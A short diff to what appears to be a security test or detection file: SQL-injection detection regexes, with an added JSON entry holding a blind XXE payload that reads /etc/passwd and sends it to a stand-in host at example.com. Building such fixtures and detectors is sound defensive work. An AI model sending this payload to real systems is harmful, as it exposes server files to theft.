@@ -1,3 +1,11 @@
 \b(?:SELECT|INSERT|UPDATE|DELETE|DROP|UNION|ALTER|EXEC(?:UTE)?|sp_executesql)\b
 \b(?:EXEC(?:UTE)?|sp_executesql)\s*\([^)]*\+\s*[^)]*\)
 \b(?:SELECT|INSERT|UPDATE|DELETE|DROP|UNION|ALTER|EXEC(?:UTE)?|sp_executesql)\b|\b(?:EXEC(?:UTE)?|sp_executesql)\s*\([^)]*\+\s*[^)]*\)
+
+
+
+
+{
+  "xml": "<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n<!ELEMENT foo (#ANY)>\n<!ENTITY % xxe SYSTEM \"file:///etc/passwd\">\n<!ENTITY blind SYSTEM \"https://www.example.com/?%xxe;\">]><foo>&blind;</foo>"
+}
+
